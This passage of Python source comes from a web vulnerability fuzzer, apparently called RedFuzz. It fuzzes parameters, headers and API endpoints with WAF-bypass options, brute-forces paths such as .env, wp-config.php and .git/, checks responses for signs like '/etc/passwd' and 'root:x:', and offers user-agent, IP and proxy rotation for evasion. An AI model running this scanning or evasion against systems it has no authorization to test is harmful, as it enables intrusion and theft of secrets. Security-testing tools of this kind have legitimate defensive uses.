                    
                    # Auto-verify vulnerability if enabled
                    if hasattr(self, 'auto_verify') and self.auto_verify:
                        if self.verify_vulnerability(result):
                            result['verified'] = True
                            result['confidence'] = 0.9
                        else:
                            result['verified'] = False
                            result['confidence'] = 0.5
                    else:
                        result['verified'] = False
                        result['confidence'] = 0.7
                else:
                    # Even if not vulnerable, try to classify the payload type
                    result['vulnerability_type'] = self.classify_vulnerability(payload, response)
                    
                return result
                
            except requests.exceptions.RequestException as e:
                # Handle different types of connection errors gracefully
                error_msg = str(e)
                
                # Check if it's a connection reset (server rejected the request)
                if "ConnectionResetError" in error_msg or "10054" in error_msg:
                    if self.verbose:
                        self.log(f"⚠️  Server rejected payload (likely WAF/IPS protection): {payload[:50]}...")
                    return None
                # Check if it's a timeout
                elif "timeout" in error_msg.lower():
                    if self.verbose:
                        self.log(f"⏱️  Timeout for payload: {payload[:50]}...")
                    return None
                # Check if it's a connection error
                elif "connection" in error_msg.lower():
                    if self.verbose:
                        self.log(f"🔌 Connection error for payload: {payload[:50]}...")
                    return None
                else:
                    if self.verbose:
                        self.log(f"❌ Error fuzzing {url}: {error_msg}")
                return None
        
        # Apply retry logic if enabled
        if hasattr(self, 'continue_on_error') and self.continue_on_error:
            return self.apply_retry_logic(_make_request)
        else:
            return _make_request()
    
    def fuzz_headers(self, url, header_name, payload, waf_bypass=False):
        """Enhanced header fuzzing with WAF bypass support"""
        
        def _make_request():
            try:
                current_payload = payload
                if waf_bypass:
                    current_payload = self.apply_waf_bypass(current_payload, random.choice(self.waf_bypass_techniques))
                # Rotate User-Agent if enabled
                self.rotate_user_agent()
                # Create headers with the payload
                headers = {header_name: current_payload}
                response = self.session.get(url, headers=headers, timeout=self.timeout, verify=self.verify_ssl)
                # Apply smart rate limiting if enabled
                if hasattr(self, 'rate_limiter') and self.rate_limiter:
                    response_time = response.elapsed.total_seconds()
                    self.rate_limiter.adjust_delay(response_time)
                    import time
                    time.sleep(self.rate_limiter.get_delay())
                # Analyze response
                result = {
                    'url': url,
                    'parameter': f"Header: {header_name}",
                    'payload': current_payload,
                    'method': 'HEADER',
                    'status_code': response.status_code,
                    'response_size': len(response.content),
                    'response_time': response.elapsed.total_seconds(),
                    'content_type': response.headers.get('content-type', ''),
                    'vulnerable': False,
                    'vulnerability_type': None
                }
                # Advanced vulnerability detection
                vulnerable, vuln_type = self.advanced_vulnerability_detection(
                    response, current_payload, self.baseline_response
                )
                if vulnerable:
                    result['vulnerable'] = True
                    result['vulnerability_type'] = vuln_type if vuln_type else 'Header Injection'
                    # Auto-verify vulnerability if enabled
                    if hasattr(self, 'auto_verify') and self.auto_verify:
                        if self.verify_vulnerability(result):
                            result['verified'] = True
                            result['confidence'] = 0.9
                        else:
                            result['verified'] = False
                            result['confidence'] = 0.5
                    else:
                        result['verified'] = False
                        result['confidence'] = 0.7
                else:
                    # Even if not vulnerable, try to classify the payload type
                    result['vulnerability_type'] = self.classify_vulnerability(current_payload, response)
                return result
            except requests.exceptions.RequestException as e:
                error_msg = str(e)
                if "ConnectionResetError" in error_msg or "10054" in error_msg:
                    if self.verbose:
                        self.log(f"⚠️  Server rejected header payload (likely WAF/IPS protection): {current_payload[:50]}...")
                    return None
                elif "timeout" in error_msg.lower():
                    if self.verbose:
                        self.log(f"⏱️  Timeout for header payload: {current_payload[:50]}...")
                    return None
                elif "connection" in error_msg.lower():
                    if self.verbose:
                        self.log(f"🔌 Connection error for header payload: {current_payload[:50]}...")
                    return None
                else:
                    if self.verbose:
                        self.log(f"❌ Error fuzzing header {header_name}: {error_msg}")
                return None
        
        # Apply retry logic if enabled
        if hasattr(self, 'continue_on_error') and self.continue_on_error:
            return self.apply_retry_logic(_make_request)
        else:
            return _make_request()
    
    def fuzz_url(self, url, payloads, method="GET", post_data=None, fuzz_headers=False, context_aware=False, waf_bypass=False, tui=None):
        """Enhanced URL fuzzing with context-aware and WAF bypass support"""
        parsed_url = urlparse(url)
        params = {}
        
        # Parse query parameters
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
        
        results = []
        total_requests = 0
        completed_requests = 0
        
        # Get baseline response
        self.baseline_response = self.get_baseline_response(url)
        
        # Show progress start
        if self.verbose and not self.tui:
            self.log(f"🚀 Starting fuzzing: {url}")
            self.log(f"📦 Payloads to test: {len(payloads)}")
        
        # Create tasks for ThreadPoolExecutor
        tasks = []
        
        # Fuzz parameters in GET or POST requests
        if method.upper() == "GET" and params:
            for param in params:
                for payload in payloads:
                    tasks.append((url, param, payload, "GET", None, waf_bypass))
        elif method.upper() == "POST" and post_data:
            for param in post_data:
                for payload in payloads:
                    tasks.append((url, param, payload, "POST", post_data, waf_bypass))
        
        # Update total requests for TUI
        total_requests = len(tasks)
        if self.tui and self.tui_instance:
            self.tui_instance.set_total_requests(total_requests)

        # Use ThreadPoolExecutor for parallel processing
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_task = {executor.submit(self.fuzz_parameter, *task): task for task in tasks}

            for completed_future in as_completed(future_to_task):
                completed_requests += 1
                current_task = future_to_task[completed_future]

                # Update TUI progress
                if self.tui and self.tui_instance:
                    current_url = current_task[0] if len(current_task) > 0 else url
                    current_payload = current_task[2] if len(current_task) > 2 else ""
                    self.tui_instance.update_payload_progress(completed_requests)
                    self.tui_instance.update_stats(
                        total_requests=completed_requests,
                        current_url=current_url,
                        current_payload=current_payload,
                        status=f"Testing... ({completed_requests}/{total_requests})"
                    )

                result = completed_future.result()
                if result:
                    results.append(result)
                    if result.get('vulnerable'):
                        vuln_type = result.get('vulnerability_type', 'Unknown')
                        if self.verbose:
                            self.log(f"🔴 {vuln_type.upper()} found in '{result.get('parameter', 'N/A')}'")
                        if self.tui and self.tui_instance:
                            self.tui_instance.add_vulnerability(
                                vuln_type,
                                result.get('url', url),
                                result.get('payload', ''),
                                f"Parameter: {result.get('parameter', 'N/A')}"
                            )
        
        # Fuzz headers if requested - FIXED to return results
        if fuzz_headers:
            header_results = []
            common_headers = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP']
            header_tasks = []

            for header in common_headers:
                for payload in payloads:
                    header_tasks.append((url, header, payload, waf_bypass))

            total_requests += len(header_tasks)
            if self.tui and self.tui_instance:
                self.tui_instance.set_total_requests(total_requests)

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                future_to_header_task = {executor.submit(self.fuzz_headers, *task): task for task in header_tasks}
                for completed_future in as_completed(future_to_header_task):
                    completed_requests += 1
                    current_task = future_to_header_task[completed_future]
                    
                    if self.tui and self.tui_instance:
                        self.tui_instance.update_payload_progress(completed_requests)
                        self.tui_instance.update_stats(
                            total_requests=completed_requests,
                            current_url=current_task[0],
                            current_payload=f"Header: {current_task[1]}",
                            status=f"Testing headers... ({completed_requests}/{total_requests})"
                        )

                    result = completed_future.result()
                    if result:
                        header_results.append(result)
                        if result.get('vulnerable'):
                            vuln_type = result.get('vulnerability_type', 'Unknown')
                            if self.tui and self.tui_instance:
                                self.tui_instance.add_vulnerability(
                                    vuln_type, url, result.get('payload', ''), f"Header: {result.get('parameter', 'N/A')}"
                                )
            results.extend(header_results)

        return results
    
    def scan_directory(self, base_url, wordlist=None):
        """Enhanced directory scanning"""
        if not wordlist:
            wordlist = [
                # Common directories
                'admin', 'login', 'wp-admin', 'administrator', 'panel', 'backup',
                'config', 'db', 'files', 'uploads', 'dev', 'api', 'v1',
                # Common files
                'robots.txt', 'sitemap.xml', '.htaccess', '.env', 'config.php',
                'wp-config.php', 'web.config', 'phpinfo.php',
                # Backup files
                'backup.zip', 'backup.tar.gz', 'backup.sql', '.bak',
                # Log files
                'error.log', 'access.log', 'debug.log',
                # Hidden files
                '.git/', '.svn/', '.DS_Store'
            ]
        
        results = []
        
        def check_path(path):
            try:
                url = urljoin(base_url, path)
                response = self.session.get(url, timeout=self.timeout, verify=False)
                if response.status_code in [200, 301, 302, 403]:
                    return {'url': url, 'status_code': response.status_code, 'path': path, 'size': len(response.content)}
                return None
            except requests.RequestException:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(check_path, path) for path in wordlist]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    if self.verbose:
                        self.log(f"Found: {result['url']} ({result['status_code']})")
        
        return results
    
    def run(self, mode="all", custom_payloads=None, method="GET", post_data=None, fuzz_headers=False, 
            context_aware=False, waf_bypass=False, crawl=False, api_test=False, report_format="json",
            fast_mode=False, ultra_fast_mode=False):
        """Enhanced fuzzer execution with advanced features from config.yaml"""
        self.summary_log(f"Starting scan: {self.target_url}")
        if fast_mode: self.summary_log("Fast mode enabled")
        if ultra_fast_mode: self.summary_log("Ultra fast mode enabled")

        # Start TUI if enabled
        if self.tui and self.tui_instance:
            tui_thread = threading.Thread(target=self.tui_instance.start, daemon=True)
            tui_thread.start()
        
        results = []
        
        # Apply custom headers and user agent rotation from config
        if hasattr(self, 'custom_headers'): self.session.headers.update(self.custom_headers)
        self.rotate_user_agent()
        
        crawl_depth = getattr(self, 'max_crawl_depth', 2)
        
        if crawl:
            self.log("Starting website crawling...")
            if self.tui and self.tui_instance:
                self.tui_instance.update_crawl_progress(0, visible=True)
                self.tui_instance.update_stats(status="Crawling website...")

            discovered_urls, discovered_forms = self.crawl_website(self.target_url, crawl_depth)
            self.log(f"Discovered {len(discovered_urls)} URLs and {len(discovered_forms)} forms")
            
            if self.tui and self.tui_instance:
                payloads = self.generate_payloads(mode, fast_mode, ultra_fast_mode)
                total_requests = self.calculate_total_requests(discovered_urls, discovered_forms, payloads, fuzz_headers)
                total_urls = len(discovered_urls) + len(discovered_forms)
                
                self.tui_instance.set_total_requests(total_requests)
                self.tui_instance.set_total_urls(total_urls)
            
            all_results = []
            processed_targets = 0
            
            for url in discovered_urls:
                processed_targets += 1
                self.log(f"Fuzzing URL {processed_targets}/{total_urls}: {url}")
                if self.tui and self.tui_instance:
                    self.tui_instance.update_url_progress(processed_targets)
                    self.tui_instance.update_stats(current_url=url, status=f"Fuzzing URL {processed_targets}/{total_urls}")
                
                payloads = self.generate_payloads(mode, fast_mode, ultra_fast_mode)
                all_results.extend(self.fuzz_url(url, payloads, 'GET', None, fuzz_headers, context_aware, waf_bypass))

            for form in discovered_forms:
                processed_targets += 1
                self.log(f"Testing form {processed_targets}/{total_urls}: {form['action']}")
                if self.tui and self.tui_instance:
                    self.tui_instance.update_url_progress(processed_targets)
                    self.tui_instance.update_stats(current_url=form['action'], status=f"Testing form {processed_targets}/{total_urls}")

                form_data = {inp.get('name'): inp.get('value', '') for inp in form.get('inputs', []) if inp.get('name')}
                payloads = self.generate_payloads(mode, fast_mode, ultra_fast_mode)
                all_results.extend(self.fuzz_url(form['action'], payloads, form.get('method', 'POST'), form_data, fuzz_headers, context_aware, waf_bypass))

            results = all_results
        
        elif api_test:
            self.log("Starting API testing...")
            if self.openapi_spec and self.openapi_spec.endpoints:
                self.log(f"Testing {len(self.openapi_spec.endpoints)} API endpoints")
                for endpoint in self.openapi_spec.endpoints:
                    results.extend(self.fuzz_api_endpoint(endpoint))
            else:
                self.log("No API endpoints found in OpenAPI spec")
        
        else:
            self.log("Starting standard fuzzing...")
            payloads = custom_payloads or self.generate_payloads(mode, fast_mode, ultra_fast_mode)
            results = self.fuzz_url(self.target_url, payloads, method, post_data, fuzz_headers, context_aware, waf_bypass)
        
        # Finalize and display results
        if self.tui and self.tui_instance:
            self.tui_instance.update_stats(status="Scan complete. Preparing results...")
            time.sleep(1) # Allow TUI to update
            self.tui_instance.stop()
            self.tui_instance.show_summary(results)
        else:
            self.display_results(results)

        # Post-scan actions
        if results:
            self.execute_plugins_on_results(results)
            if hasattr(self, 'generate_html') and self.generate_html:
                self.generate_html_report(results)
            if hasattr(self, 'export_json') and self.export_json:
                self.save_results(results)
        
        self.cleanup()
        return results
    
    def display_results(self, results):
        """Enhanced results display with better formatting"""
        if not results:
            self.log("✅ No vulnerabilities found.")
            return
        
        vulnerable = [r for r in results if r and r.get('vulnerable')]
        
        self.log(f"\n{'='*70}")
        self.log(f"🔍 SCAN RESULTS SUMMARY")
        self.log(f"{'='*70}")
        self.log(f"📊 Total requests: {len(results)}")
        self.log(f"🔴 Vulnerabilities found: {len(vulnerable)}")
        
        if vulnerable:
            vuln_types = {}
            for vuln in vulnerable:
                vuln_type = vuln.get('vulnerability_type', 'Unknown')
                vuln_types.setdefault(vuln_type, []).append(vuln)
            
            self.log(f"\n📋 VULNERABILITY BREAKDOWN:")
            for vuln_type, vuln_list in vuln_types.items():
                self.log(f"\n🔴 {vuln_type.upper()} ({len(vuln_list)} found)")
                self.log(f"{'─'*50}")
                
                param_groups = {}
                for vuln in vuln_list:
                    param = vuln.get('parameter', 'Unknown')
                    param_groups.setdefault(param, []).append(vuln)
                
                for param, param_vulns in param_groups.items():
                    self.log(f"📝 Parameter: {param}")
                    for i, vuln in enumerate(param_vulns[:3], 1):
                        payload = vuln.get('payload', 'Unknown')
                        self.log(f"   {i}. {payload[:60]}{'...' if len(payload) > 60 else ''}")
                    if len(param_vulns) > 3:
                        self.log(f"   ... and {len(param_vulns) - 3} more payloads")
                    self.log("")
        
        self.log(f"{'='*70}\n✅ Scan completed successfully!\n{'='*70}")
        self.save_results(results)
    
    def display_api_results(self, results):
        """Display API testing results"""
        if not results:
            self.log("No API endpoints found.")
            return
        
        self.log(f"\n=== REST API Testing Results ===\nTested {len(results)} endpoints")
        for result in results:
            status_color = "🟢" if result['status_code'] == 200 else "🟡"
            self.log(f"{status_color} {result['method']} {result['endpoint']} - {result['status_code']} ({result['response_size']} bytes)")
        self.save_results(results)
    
    def display_directory_results(self, results):
        """Enhanced directory scan results display"""
        if not results:
            self.log("No directories/files found.")
            return
        
        self.log(f"\n=== Enhanced Directory Scan Results ===\nFound {len(results)} items")
        for result in results:
            status_color = "🟢" if result['status_code'] == 200 else "🟡"
            self.log(f"{status_color} {result['status_code']} - {result['url']} ({result['size']} bytes)")
        self.save_results(results)
    
    def save_results(self, results, filename=None):
        """Save results to JSON file with enhanced fast JSON library support"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"redfuzz_results_{timestamp}.json"
        
        # Use fast JSON library if available
        try:
            if JSON_FAST and JSON_LIBRARY == "orjson":
                import orjson
                with open(filename, 'wb') as f:
                    f.write(orjson.dumps(results, option=orjson.OPT_INDENT_2))
            else: # ujson or standard json
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(results, f, ensure_ascii=False, indent=2)
            self.log(f"Results saved to {filename} (using {JSON_LIBRARY})")
        except Exception as e:
            self.log(f"Error saving results with {JSON_LIBRARY}: {e}. Falling back to standard JSON.")
            import json as std_json
            with open(filename, 'w', encoding='utf-8') as f:
                std_json.dump(results, f, ensure_ascii=False, indent=2)
            self.log(f"Results saved to {filename} (fallback to standard JSON)")
        
        return filename

    def initialize_tui(self):
        """Initialize the Text User Interface"""
        try:
            from redfuzz_tui import RedFuzzTUI
            self.tui_instance = RedFuzzTUI()
            # self.tui_instance.setup_layout() # setup_layout is called in tui.start()
            self.log("TUI initialized successfully")
        except ImportError as e:
            self.log(f"Failed to import TUI module: {e}")
            self.tui = False
        except Exception as e:
            self.log(f"Failed to initialize TUI: {e}")
            self.tui = False

    def setup_logging(self):
        """Setup logging for RedFuzz"""
        logging.basicConfig(
            level=logging.INFO if self.verbose else logging.WARNING,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    def load_openapi_spec(self, spec_file: str) -> bool:
        """Load OpenAPI/Swagger specification"""
        if not OPENAPI_AVAILABLE:
            self.log("OpenAPI support not available. Install PyYAML.")
            return False
        
        try:
            with open(spec_file, 'r') as f:
                spec_data = pyyaml.safe_load(f) if spec_file.endswith(('.yaml', '.yml')) else json.load(f)
            
            self.openapi_spec = OpenAPISpec(
                endpoints=spec_data.get('paths', {}),
                base_url=spec_data.get('servers', [{}])[0].get('url', ''),
                security_schemes=spec_data.get('components', {}).get('securitySchemes', {}),
                info=spec_data.get('info', {})
            )
            
            # Extract endpoints
            for path, methods in spec_data.get('paths', {}).items():
                for method, details in methods.items():
                    if method.upper() in ['GET', 'POST', 'PUT', 'DELETE']:
                        self.api_endpoints.append({
                            'path': path, 'method': method.upper(),
                            'parameters': details.get('parameters', []),
                            'requestBody': details.get('requestBody', {}),
                            'responses': details.get('responses', {})
                        })
            
            self.log(f"Loaded OpenAPI spec with {len(self.api_endpoints)} endpoints")
            return True
            
        except Exception as e:
            self.log(f"Error loading OpenAPI spec: {e}")
            return False

    def create_session_state(self, session_id: str = None) -> str:
        """Create a new session state for stateful fuzzing"""
        if session_id is None:
            session_id = hashlib.md5(f"{time.time()}".encode()).hexdigest()[:8]
        
        self.session_states[session_id] = SessionState(
            session_id=session_id, cookies={}, headers={}, current_url=self.target_url
        )
        self.current_session_id = session_id
        return session_id

    def switch_session(self, session_id: str) -> bool:
        """Switch to a different session state"""
        if session_id in self.session_states:
            session_state = self.session_states[session_id]
            self.session.cookies.update(session_state.cookies)
            self.session.headers.update(session_state.headers)
            self.current_session_id = session_id
            return True
        return False

    def update_session_state(self, response: requests.Response, session_id: str = None):
        """Update session state with response data"""
        session_id = session_id or self.current_session_id
        if session_id and session_id in self.session_states:
            session_state = self.session_states[session_id]
            session_state.cookies.update(self.session.cookies.get_dict())
            session_state.current_url = response.url
            if 'login' in response.url.lower() or 'auth' in response.url.lower():
                session_state.login_required = True

    def verify_vulnerability(self, vulnerability) -> bool:
        """Re-test a vulnerability to confirm it's not a false positive"""
        try:
            if isinstance(vulnerability, dict):
                evidence_data = {
                    'request_url': vulnerability.get('url', ''),
                    'request_method': vulnerability.get('method', 'GET'),
                    'request_headers': {}, 'request_body': None,
                    'response_status': vulnerability.get('status_code', 0),
                    'response_headers': {}, 'response_body': '',
                    'payload_used': vulnerability.get('payload', ''),
                    'detection_time': datetime.now(),
                    'response_time': vulnerability.get('response_time', 0)
                }
                evidence = VulnerabilityEvidence(**evidence_data)
                
                vuln_obj = Vulnerability(
                    vuln_type=vulnerability.get('vulnerability_type', 'Unknown'),
                    parameter=vulnerability.get('parameter', ''),
                    payload=vulnerability.get('payload', ''),
                    evidence=evidence, severity='Medium',
                    confidence=vulnerability.get('confidence', 0.5)
                )
            else:
                vuln_obj = vulnerability
            
            time.sleep(self.verification_delay)
            
            evidence = vuln_obj.evidence
            response = self.session.request(
                evidence.request_method,
                evidence.request_url,
                headers=evidence.request_headers,
                data=evidence.request_body,
                timeout=self.timeout,
                verify=False
            )
            
            if self.detect_vulnerability_in_response(response, vuln_obj.vuln_type, evidence.payload_used):
                vuln_obj.verified = True
                self.verified_vulnerabilities.append(vuln_obj)
                return True
            else:
                vuln_obj.false_positive = True
                self.false_positives.append(vuln_obj)
                return False
                
        except Exception as e:
            self.log(f"Error verifying vulnerability: {e}")
            return False

    def collect_evidence(self, url: str, method: str, headers: Dict, body: str, 
                        payload: str, response: requests.Response, response_time: float) -> VulnerabilityEvidence:
        """Collect detailed evidence for a vulnerability"""
        return VulnerabilityEvidence(
            request_url=url, request_method=method, request_headers=headers,
            request_body=body, response_status=response.status_code,
            response_headers=dict(response.headers), response_body=response.text,
            payload_used=payload, detection_time=datetime.now(), response_time=response_time
        )

    def detect_vulnerability_in_response(self, response: requests.Response, vuln_type: str, payload: str) -> bool:
        """Enhanced vulnerability detection with better accuracy and status code checking"""
        if response.status_code in [403, 404, 500, 501, 502, 503, 504, 505]:
            return False
        
        response_text = response.text.lower()
        detection_patterns = {
            'sqli': ['sql syntax', 'mysql error', 'unclosed quotation mark'],
            'xss': ['<script>alert', 'javascript:alert', 'onerror='],
            'lfi': ['root:x:', '/etc/passwd', 'failed to open stream'],
            'rfi': ['failed to open stream', 'allow_url_include'],
            'command_injection': ['uid=', 'gid=', 'command not found'],
        }
        
        if vuln_type in detection_patterns:
            if any(p in response_text for p in detection_patterns[vuln_type]):
                return True
        
        if vuln_type == 'xss' and payload.lower() in response_text:
            return True
        
        return False

    def generate_api_payloads(self, parameter_info: Dict) -> List[str]:
        """Generate payloads based on OpenAPI parameter information"""
        param_type = parameter_info.get('type', 'string')
        if param_type == 'string':
            return self.payload_categories.get('xss', []) + self.payload_categories.get('sqli', [])
        elif param_type == 'integer':
            return ['0', '1', '-1', '999999999', 'null']
        return []

    def fuzz_api_endpoint(self, endpoint: Dict) -> List[Vulnerability]:
        """Fuzz a specific API endpoint"""
        vulnerabilities = []
        path, method = endpoint['path'], endpoint['method']
        base_url = self.openapi_spec.base_url if self.openapi_spec else self.target_url
        
        for param in endpoint.get('parameters', []):
            if param.get('in') == 'path':
                param_name = param['name']
                for payload in self.generate_api_payloads(param):
                    fuzzed_url = urljoin(base_url, path.replace(f"{{{param_name}}}", payload))
                    try:
                        start_time = time.time()
                        response = self.session.request(method, fuzzed_url, timeout=self.timeout, verify=False)
                        response_time = time.time() - start_time
                        
                        for vuln_type in ['sqli', 'xss', 'lfi']:
                            if self.detect_vulnerability_in_response(response, vuln_type, payload):
                                evidence = self.collect_evidence(fuzzed_url, method, {}, None, payload, response, response_time)
                                vuln = Vulnerability(vuln_type, param_name, payload, evidence, 'High', 0.8)
                                vulnerabilities.append(vuln)
                                if self.auto_verify: self.verify_vulnerability(vuln)
                        
                        time.sleep(self.rate_limiter.get_delay())
                        self.rate_limiter.adjust_delay(response_time)
                    except Exception as e:
                        self.log(f"Error fuzzing API endpoint {fuzzed_url}: {e}")
        
        return vulnerabilities

    def run_stateful_fuzzing(self, login_url: str = None, login_data: Dict = None) -> List[Vulnerability]:
        """Run stateful fuzzing with session management"""
        vulnerabilities = []
        session_id = self.create_session_state()
        self.stateful_mode = True
        
        if login_url and login_data:
            try:
                response = self.session.post(login_url, data=login_data, timeout=self.timeout, verify=False)
                self.update_session_state(response, session_id)
                self.log("Login successful, proceeding with authenticated session" if response.ok else "Login failed, continuing unauthenticated")
            except Exception as e:
                self.log(f"Error during login: {e}")
        
        parsed_url = urlparse(self.target_url)
        params = parse_qs(parsed_url.query)
        
        for param_name in params:
            for payload in self.generate_context_aware_payloads(param_name):
                for technique in self.waf_bypass_techniques:
                    bypassed_payload = self.apply_waf_bypass(payload, technique)
                    fuzzed_params = {**params, param_name: [bypassed_payload]}
                    fuzzed_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{'&'.join([f'{k}={v[0]}' for k, v in fuzzed_params.items()])}"
                    
                    try:
                        start_time = time.time()
                        response = self.session.get(fuzzed_url, timeout=self.timeout, verify=False)
                        response_time = time.time() - start_time
                        self.update_session_state(response, session_id)
                        
                        for vuln_type in ['sqli', 'xss', 'lfi', 'rfi', 'command_injection']:
                            if self.detect_vulnerability_in_response(response, vuln_type, bypassed_payload):
                                evidence = self.collect_evidence(fuzzed_url, 'GET', dict(self.session.headers), None, bypassed_payload, response, response_time)
                                vuln = Vulnerability(vuln_type, param_name, bypassed_payload, evidence, 'High', 0.8)
                                vulnerabilities.append(vuln)
                                if self.auto_verify: self.verify_vulnerability(vuln)
                        
                        time.sleep(self.rate_limiter.get_delay())
                        self.rate_limiter.adjust_delay(response_time)
                    except Exception as e:
                        self.log(f"Error in stateful fuzzing: {e}")
        
        return vulnerabilities

    def calculate_total_requests(self, discovered_urls, discovered_forms, payloads, fuzz_headers=False):
        """Calculate total expected requests for accurate progress tracking - REFINED"""
        total_requests = 0
        
        # For discovered URLs with GET parameters
        for url in discovered_urls:
            params = parse_qs(urlparse(url).query)
            if params:
                total_requests += len(payloads) * len(params)
        
        # For discovered forms
        for form in discovered_forms:
            # Count only non-empty input names
            named_inputs = [inp['name'] for inp in form.get('inputs', []) if inp.get('name')]
            if named_inputs:
                total_requests += len(payloads) * len(named_inputs)
        
        # Add header fuzzing requests if enabled
        if fuzz_headers:
            # A more realistic estimation for headers
            common_headers = ['User-Agent', 'Referer', 'X-Forwarded-For']
            # Assume headers are fuzzed for each discovered URL and form
            total_targets = len(discovered_urls) + len(discovered_forms)
            total_requests += len(payloads) * len(common_headers) * total_targets

        # If no specific targets, estimate for the base URL
        if total_requests == 0 and self.target_url:
             params = parse_qs(urlparse(self.target_url).query)
             total_requests = len(payloads) * len(params)
             if fuzz_headers:
                 total_requests += len(payloads) * 3 # Estimate 3 common headers
        
        return total_requests

    def update_fuzzing_progress(self, completed_requests, total_requests, current_url, current_payload, status="Testing..."):
        """Update fuzzing progress in real-time - DEPRECATED in favor of direct TUI calls"""
        # This method is kept for non-TUI mode if needed, but TUI updates are now more direct.
        if self.tui and self.tui_instance:
            self.tui_instance.update_payload_progress(completed_requests)
            self.tui_instance.update_stats(
                total_requests=completed_requests,
                current_url=current_url,
                current_payload=current_payload,
                status=status
            )

    def apply_config_settings(self):
        """Apply loaded configuration settings to the fuzzer instance - ENHANCED"""
        if not self.config:
            return
        
        # Apply basic settings
        if 'threads' in self.config:
            self.threads = self.config['threads']
        if 'timeout' in self.config:
            self.timeout = self.config['timeout']
        if 'verbose' in self.config:
            self.verbose = self.config['verbose']
        if 'quiet_mode' in self.config:
            self.quiet_mode = self.config['quiet_mode']
        
        # Apply proxy settings
        if 'proxy' in self.config and self.config['proxy'].get('enabled', False):
            proxy_url = self.config['proxy'].get('url')
            if proxy_url:
                self.set_proxy(proxy_url)
        
        # Apply session management settings
        if 'session_management' in self.config:
            session_config = self.config['session_management']
            
            # Apply cookies
            if 'cookies' in session_config:
                self.set_cookies(session_config['cookies'])
            
            # Apply headers
            if 'headers' in session_config:
                self.session.headers.update(session_config['headers'])
        
        # Apply stateful fuzzing settings
        if 'stateful_fuzzing' in self.config:
            stateful_config = self.config['stateful_fuzzing']
            if stateful_config.get('enabled', False):
                self.stateful_mode = True
                self.login_url = stateful_config.get('login_url')
                self.login_data = stateful_config.get('login_data', {})
                self.session_timeout = stateful_config.get('session_timeout', 3600)
                self.cookie_persistence = stateful_config.get('cookie_persistence', True)
        
        # Apply OpenAPI integration settings
        if 'openapi_integration' in self.config:
            openapi_config = self.config['openapi_integration']
            if openapi_config.get('enabled', False):
                self.openapi_enabled = True
                self.openapi_spec_file = openapi_config.get('spec_file')
                self.openapi_base_url = openapi_config.get('base_url')
                self.auto_discover_endpoints = openapi_config.get('auto_discover_endpoints', True)
                self.include_examples = openapi_config.get('include_examples', True)
        
        # Apply vulnerability verification settings
        if 'vulnerability_verification' in self.config:
            verif_config = self.config['vulnerability_verification']
            if 'auto_verify' in verif_config:
                self.auto_verify = verif_config['auto_verify']
            if 'verification_delay' in verif_config:
                self.verification_delay = verif_config['verification_delay']
            if 'evidence_collection' in verif_config:
                self.evidence_collection = verif_config['evidence_collection']
            if 'confidence_threshold' in verif_config:
                self.confidence_threshold = verif_config['confidence_threshold']
            if 'false_positive_reduction' in verif_config:
                self.false_positive_reduction = verif_config['false_positive_reduction']
            if 're_test_count' in verif_config:
                self.re_test_count = verif_config['re_test_count']
        
        # Apply smart rate limiting settings
        if 'smart_rate_limiting' in self.config:
            rate_config = self.config['smart_rate_limiting']
            if rate_config.get('enabled', True):
                initial_delay = rate_config.get('initial_delay', 0.1)
                max_delay = rate_config.get('max_delay', 5.0)
                min_delay = rate_config.get('min_delay', 0.01)
                response_time_threshold = rate_config.get('response_time_threshold', 2.0)
                adaptive_adjustment = rate_config.get('adaptive_adjustment', True)
                burst_protection = rate_config.get('burst_protection', True)
                self.rate_limiter = SmartRateLimiter(initial_delay, max_delay)
                self.rate_limiter.min_delay = min_delay
                self.rate_limiter.response_time_threshold = response_time_threshold
                self.rate_limiter.adaptive_adjustment = adaptive_adjustment
                self.rate_limiter.burst_protection = burst_protection
        
        # Apply context patterns if provided
        if 'context_patterns' in self.config:
            self.context_patterns.update(self.config['context_patterns'])
        
        # Apply WAF bypass techniques if provided
        if 'waf_bypass_techniques' in self.config:
            self.waf_bypass_techniques = self.config['waf_bypass_techniques']
        
        # Apply payload categories if provided
        if 'payload_categories' in self.config:
            self.config_payload_categories = self.config['payload_categories']
        
        # Apply TUI settings
        if 'tui' in self.config:
            tui_config = self.config['tui']
            if tui_config.get('enabled', False):
                self.tui = True
                self.tui_refresh_rate = tui_config.get('refresh_rate', 1.0)
                self.tui_show_progress = tui_config.get('show_progress', True)
                self.tui_show_statistics = tui_config.get('show_statistics', True)
                self.tui_show_vulnerabilities = tui_config.get('show_vulnerabilities', True)
                self.tui_show_timing = tui_config.get('show_timing', True)
                self.tui_color_scheme = tui_config.get('color_scheme', 'default')
                self.tui_max_lines = tui_config.get('max_lines', 50)
        
        # Apply error handling settings
        if 'error_handling' in self.config:
            error_config = self.config['error_handling']
            self.continue_on_error = error_config.get('continue_on_error', True)
            self.max_retries = error_config.get('max_retries', 3)
            self.retry_delay = error_config.get('retry_delay', 1.0)
            self.log_errors = error_config.get('log_errors', True)
            self.ignore_ssl_errors = error_config.get('ignore_ssl_errors', False)
            self.ignore_connection_errors = error_config.get('ignore_connection_errors', False)
            self.ignore_timeout_errors = error_config.get('ignore_timeout_errors', False)
        
        # Apply performance settings
        if 'performance' in self.config:
            perf_config = self.config['performance']
            self.max_concurrent_requests = perf_config.get('max_concurrent_requests', 10)
            self.request_delay = perf_config.get('request_delay', 0.1)
            self.follow_redirects = perf_config.get('follow_redirects', True)
            self.verify_ssl = perf_config.get('verify_ssl', False)
            self.allow_redirects = perf_config.get('allow_redirects', True)
            self.max_redirects = perf_config.get('max_redirects', 5)
            self.connection_pool_size = perf_config.get('connection_pool_size', 10)
            self.keep_alive = perf_config.get('keep_alive', True)
        
        # Apply security settings
        if 'security' in self.config:
            security_config = self.config['security']
            self.user_agent_rotation = security_config.get('user_agent_rotation', False)
            self.ip_rotation = security_config.get('ip_rotation', False)
            self.proxy_rotation = security_config.get('proxy_rotation', False)
            self.session_rotation = security_config.get('session_rotation', False)
